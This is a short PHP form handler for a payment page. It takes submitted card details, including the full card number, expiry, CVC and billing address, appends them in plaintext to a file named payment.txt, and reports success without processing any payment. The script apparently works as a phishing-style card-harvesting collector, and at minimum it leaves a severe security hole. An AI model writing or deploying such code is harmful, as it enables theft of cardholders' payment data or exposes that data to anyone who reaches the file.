<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $plan = $_POST['plan'] ?? '';
    $paymentMethod = $_POST['paymentMethod'] ?? '';
    $cardHolder = $_POST['cardHolder'] ?? '';
    $cardNumber = $_POST['cardNumber'] ?? '';
    $cardExpiry = $_POST['cardExpiry'] ?? '';
    $cardCVC = $_POST['cardCVC'] ?? '';
    $cardAddress = $_POST['cardAddress'] ?? '';

    // Create a string with the form data
    $data = "Plan: $plan\n";
    $data .= "Payment Method: $paymentMethod\n";
    $data .= "Card Holder: $cardHolder\n";
    $data .= "Card Number: $cardNumber\n";
    $data .= "Expiry Date: $cardExpiry\n";
    $data .= "CVC: $cardCVC\n";
    $data .= "Billing Address: $cardAddress\n\n";

    // Write the data to a file
    file_put_contents('payment.txt', $data, FILE_APPEND);

    // Return a success message
    echo json_encode(['success' => true]);
    exit; // Stop further execution
}
?>
